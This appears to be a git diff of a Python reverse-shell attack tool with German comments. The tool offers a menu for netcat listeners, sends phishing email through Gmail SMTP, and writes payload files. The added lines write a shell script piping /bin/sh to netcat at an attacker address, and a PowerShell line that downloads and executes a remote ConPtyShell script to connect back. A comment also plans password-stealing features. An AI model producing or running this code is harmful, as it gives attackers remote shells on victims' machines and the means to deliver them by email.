@@ -9,19 +9,32 @@ def Reversshellmenu():
     Opponentsplatform = "Linux"
 
     def ListenerLinux(port, ipAdress):
-        order = "nc -lnvp {} -s {}".format(int(port), ipAdress)
-        print("connecting ...")
-        os.system(order)
-        print("disconnecting")
-        os.system("sleep 4")
+        try:
+            order = "nc -lnvp {} -s {}".format(int(port), ipAdress)
+            print("connecting ...")
+            os.system(order)
+
+        except:
+            print("Error or Connection Lost")
+            print("We check if there was an error and fix it if necessary")
+
+        finally:
+            print("disconnecting")
+            os.system("sleep 4")
 
     def ListenerWindows(port, ipAdress):
-        order = "stty raw -echo; (stty size; cat) | nc -lnvp {} -s {}".format(
-            int(port), ipAdress)
-        print("connecting ...")
-        os.system(order)
-        print("disconnecting")
-        os.system("sleep 4")
+        try:
+            order = "stty raw -echo; (stty size; cat) | nc -lnvp {} -s {}".format(int(port), ipAdress)
+            print("connecting ...")
+            os.system(order)
+
+        except:
+            print("Error or Connection Lost")
+            print("We check if there was an error and fix it if necessary")
+
+        finally:
+            print("disconnecting")
+            os.system("sleep 4")
 
     def ListenerLinux2(port, ipAdress):
         # lokaler netcat-Listener für Reverse-Bash-Shell von einem entfernten Host
@@ -58,16 +71,16 @@ def Reversshellmenu():
     # Funktion von Stealing Passwords als eingabe in die Powershell/CMD einbauen bei Linux > Windows !!!!!!!!!!!!!!!!!!!!!!!!!!
     print("""
 
--------------------------------------------------------------------------------------------------------                                                                                                                                                                                        
-,------.                                                          ,---.   ,--.              ,--. ,--.     
-|  .--. '  ,---.  ,--.  ,--.  ,---.  ,--.--.  ,---.   ,---.      '   .-'  |  ,---.   ,---.  |  | |  |     
-|  '--'.' | .-. :  \  `'  /  | .-. : |  .--' (  .-'  | .-. :     `.  `-.  |  .-.  | | .-. : |  | |  |     
-|  |\  \  \   --.   \    /   \   --. |  |    .-'  `) \   --.     .-'    | |  | |  | \   --. |  | |  |     
-`--' '--'  `----'    `--'     `----' `--'    `----'   `----'     `-----'  `--' `--'  `----' `--' `--'     
--------------------------------------------------------------------------------------------------------                                                                     
+-------------------------------------------------------------------------------------------------------
+,------.                                                          ,---.   ,--.              ,--. ,--.
+|  .--. '  ,---.  ,--.  ,--.  ,---.  ,--.--.  ,---.   ,---.      '   .-'  |  ,---.   ,---.  |  | |  |
+|  '--'.' | .-. :  \  `'  /  | .-. : |  .--' (  .-'  | .-. :     `.  `-.  |  .-.  | | .-. : |  | |  |
+|  |\  \  \   --.   \    /   \   --. |  |    .-'  `) \   --.     .-'    | |  | |  | \   --. |  | |  |
+`--' '--'  `----'    `--'     `----' `--'    `----'   `----'     `-----'  `--' `--'  `----' `--' `--'
+-------------------------------------------------------------------------------------------------------
 (1)Choose Opponent's platform type ( Choosen Opponent's platform %s )
-(2)Start Listening                        
-(3)Choose Type of attack for getting a Acess                           
+(2)Start Listening
+(3)Choose Type of attack for getting a Acess
 (00)Exit
 -------------------------------------------------------------------------------------------------------
         """ % (Opponentsplatform))
@@ -101,17 +114,21 @@ def Reversshellmenu():
 
     elif v == "3":
         # Mail versenden, nen Datei erstellen, ne Powershell oder Shell datei, den Command in den Clip abspeichern oder einenfach nur Angeben
-        print("""   
-        -------------------------------------------------------------------------------------------------------                                                                     
+        print("""
+        -------------------------------------------------------------------------------------------------------
         (1)Sending a Mail
-        (2)Export a Executable file (.sh / .exe / .bat / .ps)                   
-        (3)HTTP - Server                        
+        (2)Export a Executable file (.sh / .exe / .bat / .ps)
+        (3)HTTP - Server
         (00)Exit
         -------------------------------------------------------------------------------------------------------
         """)
         print("Choose a Option >>> ")
         choiseAcess = (input(""))
         if choiseAcess == "1":
+            print ("What is your Gmail-Adress >>> ")
+            Gmail_login_name = (input(""))
+            print ("What is your Gmail-Account-Password >>> ")
+            Gmail_Password = (input(""))
             print ("Which Sender shoud used in the mail >>> ")
             Sender = (input(""))
             print ("How shoud received the mail >>> ")
@@ -123,7 +140,7 @@ def Reversshellmenu():
             while email_message!="exit":
                 print ("""Enter your message, if you are fineshed type "exit" >>> """)
                 email_message = (input(""))
-   
+
             # EmailMessage-Objekt erstellen
             email = EmailMessage()
             # Von wem ist die E-Mail?
@@ -140,24 +157,23 @@ def Reversshellmenu():
                 # Sichere Verbindung zum Server
                 smtp.starttls()
                 # Melden Sie sich mit Benutzernamen und Passwort an einer Dummy-E-Mail an. Denken Sie daran, E-Mail so einzustellen, dass weniger sichere Apps zugelassen werden, wenn Sie Gmail verwenden.
-                smtp.login("login_name", "passwort")
+                smtp.login(Gmail_login_name, Gmail_Password)
                 # E-Mail senden.
                 smtp.send_message(email)
-            exit
+            Reversshellmenu()
+
+            
         elif choiseAcess == "2":
-            #Notes ich brauch unbedingt Datein die ich in den HTTP Server einbauen kann...
-            #Wichtig sie müssen beim Ausführen direkt ne verbindung aufbauen wollen...
-            #Einmal Powershell und einmal Shell Script Windows/Linux und je nach Auswahl Opponentsplatform= Linux oder Windows setzten
-            print("""   
-            -------------------------------------------------------------------------------------------------------                                                                     
+            print("""
+            -------------------------------------------------------------------------------------------------------
             (1)Shell Scirpt (.sh)
-            (2)Powershell Scirpt (.ps)      
+            (2)Powershell Scirpt (.ps)
             (00)Exit
             -------------------------------------------------------------------------------------------------------
             """)
             print("Choose a Option >>> ")
             t = (input(""))
-            if t==1:
+            if t=="1":
                 print ("Which Port shoud used >>> ")
                 PORT = int(input(""))
                 print ("Which IPADRESS has the Listener shoud used >>> ")
@@ -165,11 +181,12 @@ def Reversshellmenu():
                 print ("Which Name has the excutable file >>> ")
                 Filename = (input(""))
                 content = (f"/bin/sh | nc {IPADRESS} {PORT}")
-            
-            if t==2:
-                f = open("mydocument.txt", "w+")
-                f.write("This text is written in python")
-                f.close
+                myfile = (f"{Filename}.sh")
+                with open(myfile, "w") as f:
+                    f.write(content)
+                Reversshellmenu()
+
+            if t=="2":
                 print ("Which Port shoud used >>> ")
                 PORT = int(input(""))
                 print ("Which IPADRESS has the Listener shoud used >>> ")
@@ -177,6 +194,10 @@ def Reversshellmenu():
                 print ("Which Name has the excutable file >>> ")
                 Filename = (input(""))
                 content = (f"IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {IPADRESS} {PORT}")
+                myfile = (f"{Filename}.ps1")
+                with open(myfile, "w") as f:
+                    f.write(content)
+                Reversshellmenu()
 
         elif choiseAcess == "3":
             print ("Which Port shoud used >>> ")
